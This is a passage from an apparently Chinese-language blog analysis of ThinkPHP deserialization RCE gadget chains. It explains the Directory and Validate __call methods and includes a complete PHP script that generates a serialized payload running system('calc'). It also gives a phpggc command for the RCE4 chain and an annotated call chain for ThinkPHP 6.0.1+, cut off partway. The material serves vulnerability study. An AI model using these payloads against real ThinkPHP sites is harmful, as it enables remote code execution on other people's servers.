<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Plugins pass-through.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method = &quot;getItem&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array  $arguments = Psr6Cache-&gt;key</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å°† $this-&gt;path æ’å…¥åˆ° $arguments æ•°ç»„å¤´éƒ¨</span></span><br><span class="line">    <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ„é€ ä¸€ä¸ªå›è°ƒï¼Œç”¨äºè°ƒç”¨ $this-&gt;filesystem çš„ $method æ–¹æ³•</span></span><br><span class="line">    <span class="variable">$callback</span> = [<span class="variable language_">$this</span>-&gt;filesystem, <span class="variable">$method</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ„é€ çš„å›è°ƒï¼Œå¹¶ä¼ å…¥ $arguments æ•°ç»„</span></span><br><span class="line">        <span class="comment">// ä¹Ÿå°±æ˜¯ [Directory-&gt;path, Psr6Cache-&gt;key]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$callback</span>, <span class="variable">$arguments</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">BadMethodCallException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°ä¸»è¦åŠŸèƒ½æ˜¯åœ¨ <code>$this</code> è‡ªèº«æ²¡æœ‰ <code>$method</code> æ–¹æ³•çš„æƒ…å†µä¸‹è°ƒç”¨ <code>$this-&gt;filesystem</code> çš„ <code>$method</code> æ–¹æ³•ï¼Œè€Œå‚æ•°æ–¹é¢åˆ™åœ¨åŸå§‹å‚æ•°çš„åŸºç¡€ä¸Šå°† <code>$this-&gt;path</code> æ’åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¸Šï¼Œä¹Ÿå°±æ˜¯ <code>[Directory-&gt;path, Psr6Cache-&gt;key]</code>ã€‚</p>
<p>ç”±äº <code>$this-&gt;filesystem</code> æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„ <code>getItem</code>ï¼ˆæˆ–è€…æ˜¯ <code>__call</code>ï¼‰æ–¹æ³•ï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªå¯æ§å‚æ•°</strong>ã€‚</p>
<p>åœ¨ ThinkPHP ä¸­æœ‰å¦ä¸€ä¸ª <code>think\Validate</code> ç±»ï¼Œè¿™ä¸ªç±»çš„ <code>__call</code> æ–¹æ³•ä¼šè°ƒç”¨ç±»çš„ <code>is</code> æ–¹æ³•ï¼ŒåŒæ—¶å‚æ•°ä¼ å…¥<strong>åŸæœ¬çš„å‚æ•°</strong>å’Œ<strong>ç»è¿‡è½¬æ¢åï¼ˆæŒ‰ç…§å°é©¼å³°è§„åˆ™å»æ‰ <code>is</code> å‰ç¼€ï¼‰çš„æ–¹æ³•å</strong>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åŠ¨æ€æ–¹æ³• ç›´æ¥è°ƒç”¨isæ–¹æ³•è¿›è¡ŒéªŒè¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method æ–¹æ³•å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array  $args   è°ƒç”¨å‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ–¹æ³•å $method æ˜¯å¦ä»¥ &quot;is&quot; å¼€å¤´ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;is&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$method</span>, <span class="number">0</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        <span class="comment">// å»æ‰æ–¹æ³•å $method ä¸­çš„ &quot;is&quot; å‰ç¼€ï¼Œä¾‹å¦‚ isEmail -&gt; Email</span></span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$method</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æ–¹æ³•å $method é¦–å­—æ¯å°å†™åï¼Œä½œä¸ºéªŒè¯è§„åˆ™æ·»åŠ åˆ°å‚æ•°æ•°ç»„ $args æœ«å°¾</span></span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$args</span>, <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨æœ¬ç±»ä¸­çš„ is() æ–¹æ³•ï¼Œå¹¶ä¼ é€’å‚æ•°ï¼ˆåŸæœ¬å‚æ•° $args + $methodï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;is&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œå¯¹äº <code>think\Validate</code> ç±»çš„ <code>is</code> æ–¹æ³•ï¼Œå¦‚æœå‰é¢çš„ <code>call_user_func_array</code> çš„å‚æ•° <code>$args</code> æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li><p>ç¬¬ 2 ä¸ªå‚æ•°è½¬æ¢ä¸ºå°é©¼å³°åä¸æ˜¯ <code>require</code>, <code>accepted</code>, <code>date</code>, <code>activeUrl</code>ï¼Œ<code>boolean</code>, <code>bool</code>, <code>number</code>, <code>alphaNum</code>ï¼Œ<code>array</code>, <code>file</code>, <code>image</code>, <code>token</code> ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚</p>
</li>
<li><p>ç¬¬ 3 ä¸ªå‚æ•°ç±»å‹ä¸ºæ•°ç»„ã€‚å› ä¸º<strong>å¦‚æœ <code>$args</code> ä¸­çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸æ˜¯æ•°ç»„ç±»å‹</strong>ï¼Œä¼šå‡ºç° <strong>PHP ç±»å‹é”™è¯¯ï¼ˆTypeErrorï¼‰</strong></p>
<blockquote>
<p><strong>PHP æ˜¯å¼±ç±»å‹è¯­è¨€</strong>ï¼Œä½†ä» <strong>PHP 7.0 èµ·å¼•å…¥äº†â€œä¸¥æ ¼ç±»å‹â€æç¤ºæœºåˆ¶ï¼ˆä¸¥æ ¼å‚æ•°ç±»å‹å£°æ˜ï¼‰</strong>ã€‚è¿™é‡Œçš„ <code>array $data</code> å°±æ˜¯ <strong>å‚æ•°ç±»å‹å¼ºçº¦æŸï¼ˆtype hintingï¼‰</strong>ï¼Œä¸æ˜¯â€œå¼±ç±»å‹â€çš„è¡Œä¸ºã€‚</p>
</blockquote>
</li>
</ul>
<p><strong>å°±å¯ä»¥è°ƒç”¨ <code>$this-&gt;type[$rule]</code> æŒ‡å®šçš„æ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•° <code>$value</code>ã€‚è¿™é‡Œ <code>$rule</code> å’Œ <code>$value</code> åˆ†åˆ«æ˜¯å‰é¢ <code>__call</code> ä¼ å…¥çš„ç¬¬ 1ã€2 ä¸ªå‚æ•°ã€‚</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * éªŒè¯å­—æ®µå€¼æ˜¯å¦ä¸ºæœ‰æ•ˆæ ¼å¼</span></span><br><span class="line"><span class="comment"> * @access public</span></span><br><span class="line"><span class="comment"> * @param mixed  $value å­—æ®µå€¼</span></span><br><span class="line"><span class="comment"> * @param string $rule  éªŒè¯è§„åˆ™</span></span><br><span class="line"><span class="comment"> * @param array  $data  æ•°æ®</span></span><br><span class="line"><span class="comment"> * @return bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public function <span class="title function_">is</span><span class="params">($value, <span class="built_in">string</span> $rule, <span class="built_in">array</span> $data = [])</span>: <span class="type">bool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å°† $rule ä¸‹åˆ’çº¿è½¬å°é©¼å³°ç„¶ååˆ¤æ–­å¤„ç†</span></span><br><span class="line">    <span class="keyword">switch</span> (Str::camel($rule)) &#123;</span><br><span class="line">        <span class="comment">// ç¡®ä¿ä¸è¦è¿›å…¥ä¸‹é¢å…¶ä»–å‡ ç§åˆ†æ”¯ï¼š</span></span><br><span class="line">        <span class="comment">// require, accepted, date, activeUrl</span></span><br><span class="line">        <span class="comment">// boolean, bool, number, alphaNum</span></span><br><span class="line">        <span class="comment">// array, file, image, token</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (isset($this-&gt;type[$rule])) &#123;</span><br><span class="line">                <span class="comment">// è°ƒç”¨ $this-&gt;type[$rule] æ–¹æ³•ï¼Œå‚æ•°ä¸º $value å³ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">                $result = call_user_func_array($this-&gt;type[$rule], [$value]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°åˆ©ç”¨å‰é¢ <code>Directory</code> çš„ <code>__call</code> æ–¹æ³•çš„ <code>call_user_func_array</code> è°ƒç”¨ <code>Validate</code> ç±»çš„ <code>__call</code> æ–¹æ³•æ¥å®ç° RCEã€‚</p>
<p>ç„¶è€Œè™½ç„¶ <code>Validate</code> ç±»æ²¡æœ‰ <code>getItem</code> å› æ­¤å¯ä»¥è°ƒåˆ° <code>__call</code> å‡½æ•°ï¼Œä½†æ˜¯ <code>Validate</code> éœ€è¦æˆ‘ä»¬æœ‰ 3 ä¸ªå‚æ•°å¯æ§ï¼Œè€Œæˆ‘ä»¬åˆ©ç”¨ <code>Directory</code> çš„ <code>__call</code> æ–¹æ³•è°ƒç”¨è¿‡æ¥åªæœ‰ 2 ä¸ªå‚æ•°å¯æ§ï¼Œä¸æ»¡è¶³åˆ©ç”¨æ¡ä»¶ã€‚</p>
<p>ä¸è¿‡æˆ‘ä»¬è§‚å¯Ÿåˆ° <strong><code>Directory</code> çš„ <code>__call</code> æ–¹æ³•åœ¨è°ƒç”¨ <code>call_user_func_array</code> ä¹‹å‰ä¼šå‘å‚æ•°åˆ—è¡¨çš„å¤´éƒ¨æ’å…¥ä¸€ä¸ª <code>$this-&gt;path</code></strong> ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥<strong>å†è°ƒç”¨ä¸€æ¬¡ <code>Directory</code> çš„ <code>__call</code> æ–¹æ³•ç¡®ä¿å‚æ•°æ•°ç»„ä¸­æœ‰ 3 ä¸ªå€¼å¯æ§</strong>ï¼Œç„¶åå†è°ƒç”¨ <code>Validate</code> ç±»çš„ <code>__call</code> æ–¹æ³•æ¥å®ç° RCEã€‚</p>
<h3 id="åˆ©ç”¨è„šæœ¬-2"><a href="#åˆ©ç”¨è„šæœ¬-2" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">type</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;type = [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$function</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Directory</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">filesystem</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filesystem = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Directory</span>(<span class="number">1</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="string">&quot;key&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filesystem = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Validate</span>(<span class="variable">$function</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="variable">$parameter</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Psr6Cache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">pool</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pool = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Directory</span>(<span class="number">0</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Psr6Cache</span>(&quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE4ï¼ˆå½±å“-6-0-1-ï¼‰"><a href="#RCE4ï¼ˆå½±å“-6-0-1-ï¼‰" class="headerlink" title="RCE4ï¼ˆå½±å“ 6.0.1+ï¼‰"></a>RCE4ï¼ˆå½±å“ 6.0.1+ï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯-3"><a href="#åŸºæœ¬ä¿¡æ¯-3" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š6.0.1+</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE4 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE4.svg"
                      alt="TPRCE4"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">exists</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">force</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">lazySave</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">suffix</span>:<span class="keyword">protected</span>] =&gt; think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [key] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [key] =&gt; calc</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">withAttr</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [key] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [key] =&gt; system</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">json</span>:<span class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; key</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">jsonAssoc</span>:<span class="keyword">protected</span>] =&gt; <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">withEvent</span>:<span class="keyword">protected</span>] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave)                                         <span class="comment">// âœ… $this-&gt;lazySave = trueï¼Œè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">save</span>(<span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br><span class="line">        â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setAttrs</span>([])                                  <span class="comment">// âœ… ç©ºæ•°ç»„ï¼Œæ— å±æ€§è¢«è®¾ç½®</span></span><br><span class="line">        â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) <span class="comment">// âœ… $this-&gt;data éç©ºï¼›$this-&gt;withEvent = false â†’ trigger è¿”å› trueï¼Œä¸è¿›å…¥</span></span><br><span class="line">        â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;exists)                                   <span class="comment">// âœ… $this-&gt;exists = trueï¼Œè¿›å…¥åˆ†æ”¯</span></span><br><span class="line">            â””â”€â”€ <span class="title function_ invoke__">updateData</span>(): <span class="keyword">bool</span></span><br><span class="line">                â””â”€â”€ <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) <span class="comment">// âœ… $this-&gt;withEvent = false â†’ trigger è¿”å› trueï¼Œä¸è¿›å…¥</span></span><br><span class="line">                â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>()                           <span class="comment">// âœ… ç©ºå®ç°ï¼Œæ— æ“ä½œ</span></span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">getChangedData</span>(): <span class="keyword">array</span>                      <span class="comment">// âœ… è¿”å›çš„ $data å¿…é¡»æ˜¯ array ç±»å‹çš„</span></span><br><span class="line">                    â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;force)                        <span class="comment">// âœ… $this-&gt;force = true</span></span><br><span class="line">                        â””â”€â”€ <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;data                  <span class="comment">// âœ… $this-&gt;data = [&#x27;key&#x27; =&gt; [&#x27;key&#x27; =&gt; &#x27;calc&#x27;]]</span></span><br><span class="line">                    â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) <span class="comment">// âœ… $this-&gt;readonly = []ï¼Œä¸è¿›å…¥å¾ªç¯</span></span><br><span class="line">                    â””â”€â”€ <span class="keyword">return</span> <span class="variable">$data</span></span><br><span class="line">                â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>))                            <span class="comment">// âœ… $data éç©ºï¼Œä¸è¿›å…¥</span></span><br><span class="line">                â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) <span class="comment">// âœ… autoWriteTimestamp = nullï¼Œä¸è¿›å…¥</span></span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">checkAllowFields</span>(): <span class="keyword">array</span></span><br><span class="line">                    â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field))                <span class="comment">// âœ… field = nullï¼Œè¿›å…¥</span></span><br><span class="line">                        â””â”€â”€ <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema))          <span 